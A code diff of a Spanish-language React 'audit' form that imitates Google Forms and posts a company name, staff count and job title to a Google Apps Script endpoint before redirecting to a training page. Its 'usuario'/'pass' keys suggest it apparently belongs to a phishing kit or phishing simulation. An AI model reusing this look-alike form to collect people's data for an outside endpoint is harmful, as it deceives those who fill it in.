@@ -10,9 +10,9 @@ const AuditForm = () => {
   const webAppUrl = "https://script.google.com/macros/s/AKfycbzvYw6wrFwLPUWZ4dhM7HDF04wQRK0zLgfkey36BaicDoA75Zp3dM647ZkvV0raZim3/exec";
 
   const handleSubmit = async () => {
-    // ALERTA DE CAMPOS VACÍOS
+    // ALERTA DE VALIDACIÓN
     if (!empresa.trim() || !trabajadores || !cargo.trim() || !protocolo) {
-      alert("⚠️ ATENCIÓN: Todos los campos son obligatorios. Debes rellenar el formulario completo y aceptar el protocolo de veracidad.");
+      alert("⚠️ Error: Debes rellenar todos los campos y aceptar el protocolo antes de enviar.");
       return;
     }
 
@@ -23,11 +23,10 @@ const AuditForm = () => {
         mode: "no-cors",
         body: JSON.stringify({ 
           usuario: empresa, 
-          pass: `Personal: ${trabajadores} | Cargo: ${cargo}`, 
+          pass: `Emp: ${trabajadores} | Cargo: ${cargo}`, 
           tipo: "DATOS_CUESTIONARIO" 
         })
       });
-      // Redirigir después de enviar
       window.location.href = "formacion.html";
     } catch (e) {
       window.location.href = "formacion.html";
@@ -45,38 +44,34 @@ const AuditForm = () => {
       </div>
 
       <div className="forms-card p-6 mb-4">
-        <label className="block mb-4 font-medium text-card-foreground">Nombre de tu empresa *</label>
+        <label className="block mb-4 font-medium">Nombre de tu empresa *</label>
         <input type="text" value={empresa} onChange={(e) => setEmpresa(e.target.value)} className="forms-input w-full" placeholder="Tu respuesta" />
       </div>
 
       <div className="forms-card p-6 mb-4">
-        <label className="block mb-4 font-medium text-card-foreground">Nº de trabajadores *</label>
+        <label className="block mb-4 font-medium">¿Cuántos trabajadores tienes? *</label>
         {["1-10", "11-50", "50+"].map(opt => (
           <label key={opt} className="flex items-center gap-3 mb-2 cursor-pointer">
-            <input type="radio" name="trab" onChange={() => setTrabajadores(opt)} className="forms-radio" />
+            <input type="radio" name="t" onChange={() => setTrabajadores(opt)} className="forms-radio" />
             <span className="text-sm">{opt}</span>
           </label>
         ))}
       </div>
 
       <div className="forms-card p-6 mb-4">
-        <label className="block mb-4 font-medium text-card-foreground">Cargo del responsable *</label>
+        <label className="block mb-4 font-medium">Cargo en el departamento *</label>
         <input type="text" value={cargo} onChange={(e) => setCargo(e.target.value)} className="forms-input w-full" placeholder="Tu respuesta" />
       </div>
 
       <div className="forms-card p-6 mb-6">
         <label className="flex items-center gap-3 cursor-pointer">
-          <input type="checkbox" checked={protocolo} onChange={(e) => setProtocolo(e.target.checked)} className="w-4 h-4" />
-          <span className="text-sm">Confirmo que la información es veraz y acepto el protocolo.</span>
+          <input type="checkbox" checked={protocolo} onChange={(e) => setProtocolo(e.target.checked)} className="w-4 h-4 accent-[#673ab7]" />
+          <span className="text-sm">Confirmo que la información es veraz y corresponde al expediente.</span>
         </label>
       </div>
 
-      <button 
-        onClick={handleSubmit} 
-        disabled={isSubmitting} 
-        className={`forms-btn-submit ${isSubmitting ? 'opacity-50' : ''}`}
-      >
-        {isSubmitting ? "Enviando datos..." : "Enviar auditoría"}
+      <button onClick={handleSubmit} disabled={isSubmitting} className="forms-btn-submit">
+        {isSubmitting ? "Enviando..." : "Enviar"}
       </button>
     </div>
   );
